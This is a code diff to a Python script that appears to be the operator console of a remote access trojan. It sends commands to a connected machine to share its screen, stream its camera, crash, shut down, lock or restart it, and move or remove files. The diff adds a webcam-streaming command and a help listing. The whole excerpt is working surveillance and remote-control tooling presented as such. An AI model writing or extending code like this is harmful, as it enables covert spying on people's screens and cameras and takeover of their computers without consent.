@@ -5,7 +5,8 @@ from vidstream import StreamingServer
 import threading
 import time
 
-ip = "private ipv4"
+#ip = "private ipv4"
+ip = "127.0.0.1"
 port=8080
 restart = True
 
@@ -32,6 +33,9 @@ def main():
             elif command == "screenshare":
                 screenshare(conn, command, sock)
                 conn, sock = connect()
+            elif command == "camera":
+                camera(conn, command, sock)
+                conn, sock = connect()
             elif command == "website":
                 website(conn, command)
             elif command == "crash":
@@ -52,6 +56,8 @@ def main():
                 print("nope")
             elif command == "remove":
                 print("nope")
+            elif command == "help":
+                print("exit, username, screenshare, website, crash, shutdown, lock, restart, getcwd, files, download, upload, remove")
         conn.close()
 
 
@@ -109,8 +115,16 @@ def username(conn, command):
 
 def screenshare(conn, command, sock):
     conn.send(command.encode())
-    #time = input("Enter time >> ")
-    #conn.send(time.encode())
+    sock.close()
+    conn.close()
+    receiver = StreamingServer(ip, 8080)
+    t = threading.Thread(target=receiver.start_server)
+    t.start()
+    time.sleep(15)
+    receiver.stop_server()
+
+def camera(conn, command, sock):
+    conn.send(command.encode())
     sock.close()
     conn.close()
     receiver = StreamingServer(ip, 8080)
